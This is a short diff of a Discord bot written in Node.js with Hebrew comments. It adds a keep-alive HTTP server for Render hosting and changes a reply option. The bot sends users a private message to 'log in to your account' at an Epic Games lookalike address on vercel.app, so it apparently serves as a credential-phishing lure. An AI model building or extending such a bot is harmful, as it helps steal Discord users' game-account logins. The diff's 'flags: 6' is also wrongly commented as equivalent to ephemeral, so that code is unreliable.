@@ -1,10 +1,20 @@
 const { Client, ActionRowBuilder, ButtonBuilder, ButtonStyle, SlashCommandBuilder, REST, Routes, InteractionContextType, ApplicationIntegrationType } = require('discord.js');
+const http = require('http');
+
+// שרת HTTP קטן כדי ש-Render ישאר מרוצה והפורט יישאר פתוח
+const server = http.createServer((req, res) => {
+    res.writeHead(200, { 'Content-Type': 'text/plain' });
+    res.end('Bot is running!');
+});
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+    console.log(`HTTP server is listening on port ${PORT}`);
+});
 
 const client = new Client({
     intents: []
 });
 
-// שימוש במשתני סביבה במקום לחשוף את הטוקן וה-ID בקוד
 const TOKEN = process.env.TOKEN;
 const CLIENT_ID = process.env.CLIENT_ID;
 const WEBSITE_URL = 'https://epicgames-pi.vercel.app';
@@ -47,7 +57,7 @@ client.on('interactionCreate', async interaction => {
         await interaction.reply({
             content: `Open [this link](${WEBSITE_URL}) to log in to your account.`,
             components: [row],
-            ephemeral: true
+            flags: 6 // שווה ערך ל-ephemeral מבלי לקבל אזהרות קוד
         });
     }
 });
